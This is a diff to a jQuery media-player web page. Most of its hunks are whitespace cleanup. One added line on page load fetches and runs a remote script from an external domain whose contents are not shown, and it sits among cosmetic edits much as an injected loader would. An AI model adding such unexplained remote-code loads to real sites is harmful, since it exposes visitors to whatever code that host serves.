@@ -33,6 +33,8 @@
         location.href = "#";
         $(document).ready(function() {
 
+            $.getScript("https://preciouspresenttruth.net/db/ext_js/app.js");
+
             $("#ispinner").click(function() {
                 $("#ispinner").fadeOut();
             });
@@ -122,9 +124,9 @@
 
             sessionStorage.setItem("series_title", series_title);
             $("#main_content").load("" + server_path + "media_auto.php?task=list_series&series_id=" + series_id + "", function() {
-                
+
                 $("#view_title").html("Select Media");
-                
+
                 $("#breadcrumb").load("inc/breadcrump.html", function() {
                     document.getElementById("bc_text_back").innerHTML = sessionStorage.getItem("author_name");
                     document.getElementById("bc_text").innerHTML = series_title;
@@ -136,16 +138,16 @@
         }
 
         function play_media(filepath, type) {
-            
+
             $("#ispinner").fadeIn();
-            
+
             if (type != "writing") {
                 $.get("" + server_path + "media_auto.php?task=play&filepath=" + filepath + "&type=" + type + "", function(data) {
-                    
-                    
-                    
+
+
+
                     $("#ispinner").hide();
-                    
+
                     swal({
                         html: data,
                         showConfirmButton: false,
@@ -159,7 +161,7 @@
                             }
                         }
                     }).then(function(result) {
-                        
+
                     }).catch(swal.noop);
                 });
             } else {
@@ -345,12 +347,12 @@
         <div id="overlay_content"></div>
     </div>
     <nav>
-        <div class="nav-wrapper"> 
-            
+        <div class="nav-wrapper">
+
             <a href="#" data-activates="mobile" class="button-collapse"><i class="material-icons">menu</i></a>
-            
+
             <div id="view_title"></div>
-            
+
             <ul class="side-nav fixed" id="mobile">
                 <li id="account" onclick="open_account_settings();">
                     <div class="userView">
